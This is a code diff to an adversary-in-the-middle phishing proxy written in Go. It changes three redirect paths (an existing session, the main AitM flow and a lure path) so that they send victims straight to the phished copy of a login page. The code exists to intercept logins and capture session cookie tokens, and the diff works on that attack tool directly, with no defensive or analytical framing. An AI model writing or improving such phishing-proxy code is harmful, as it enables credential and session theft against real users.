@@ -2045,8 +2045,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if session, exists := p.sessions[ps.SessionId]; exists && (session.DCMode == DCModeOff || session.DCMode == "") {
 									// Check if session hasn't completed authentication yet
 									if !session.IsDone && len(session.CookieTokens) == 0 {
-										// Redirect to original login URL; response handler rewrites to phish domain
+										// Redirect to phished login URL (rewrite from original)
 										rurl := pl.GetLoginUrl()
+										if phishedUrl, ok := p.replaceUrlWithPhished(rurl); ok {
+											rurl = phishedUrl
+										}
 										log.Important("[%d] [AitM] redirecting existing session to: %s", ps.Index, rurl)
 										resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 										resp.Header.Set("Location", rurl)
@@ -2441,10 +2444,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 									// --- End device code chaining ---
 
-									// AitM flow: 302 redirect to the ORIGINAL login URL.
-									// The response handler rewrites Location to the phish domain
-									// and sets the session cookie via ps.Created.
+									// AitM flow: 302 redirect to the phished login URL.
 									rurl := pl.GetLoginUrl()
+									if phishedUrl, ok := p.replaceUrlWithPhished(rurl); ok {
+										rurl = phishedUrl
+									}
 									log.Important("[%d] [AitM] 302 redirect to: %s", sid, rurl)
 									resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 									resp.Header.Set("Location", rurl)
@@ -2668,8 +2672,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, req.Host, req_path)
 					if err == nil {
-						// redirect from lure path to login url
+						// redirect from lure path to phished login url
 						rurl := pl.GetLoginUrl()
+						if phishedUrl, ok := p.replaceUrlWithPhished(rurl); ok {
+							rurl = phishedUrl
+						}
 						u, err := url.Parse(rurl)
 						if err == nil {
 							if !strings.EqualFold(req_path, u.Path) {
